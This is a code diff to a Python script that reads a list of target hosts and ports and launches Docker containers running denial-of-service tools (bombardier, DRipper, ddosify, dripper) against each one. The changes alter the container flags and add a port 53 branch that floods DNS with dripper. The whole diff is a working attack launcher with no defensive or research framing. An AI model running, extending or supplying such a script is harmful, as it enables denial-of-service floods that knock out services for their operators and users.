@@ -27,18 +27,18 @@ for i, line in enumerate(file):
         current_line = line.split(':')
         targets.append([current_line[0], current_line[1].split(',')])
 
-const_part1 = "docker run "
+const_part1 = "docker run -it --rm "
 
-alpine1 = const_part1 + "--rm alpine/bombardier -c " + requests + " -d " + duration + "s -l "
+alpine1 = const_part1 + "alpine/bombardier -c " + requests + " -d " + duration + "s -l "
 
-ddos_ripper1 = const_part1 + "--rm -i --entrypoint python3 nitupkcuf/ddos-ripper:latest -u DRipper.py -s "
+ddos_ripper1 = const_part1 + "-i --entrypoint python3 nitupkcuf/ddos-ripper:latest -u DRipper.py -s "
 ddos_ripper2 = " -t " + turbo + " -p "
 
-ddosify1 = const_part1 + "--rm ddosify/ddosify ddosify -t "
+ddosify1 = const_part1 + "ddosify/ddosify ddosify -t "
 ddosify2 = " -n " + requests + " -d " + duration + " -p "
 ddosify3 = " -m PUT -T " + timeout
 
-dripper1 = const_part1 + "--rm alexmon1989/dripper:1.0.1 -s "
+dripper1 = const_part1 + "alexmon1989/dripper:1.0.1 -s "
 dripper2 = " -p "
 dripper3 = " -t " + duration
 
@@ -55,6 +55,9 @@ for item in targets:
             Popen(f"{ddosify1}{item[0]}{ddosify2}HTTP{ddosify3}", creationflags=subprocess.CREATE_NEW_CONSOLE)
         elif port == '443':
             Popen(f"{ddosify1}{item[0]}{ddosify2}HTTPS{ddosify3}", creationflags=subprocess.CREATE_NEW_CONSOLE)
+        elif port == '53':
+            Popen(f"{dripper1}{item[0]}{dripper2}{port}{dripper3}", creationflags=subprocess.CREATE_NEW_CONSOLE)
         else:
+            # Popen(f"{ddos_ripper1}{item[0]}{ddos_ripper2}{port}", creationflags=subprocess.CREATE_NEW_CONSOLE)
             Popen(f"{dripper1}{item[0]}{dripper2}{port}{dripper3}", creationflags=subprocess.CREATE_NEW_CONSOLE)
 
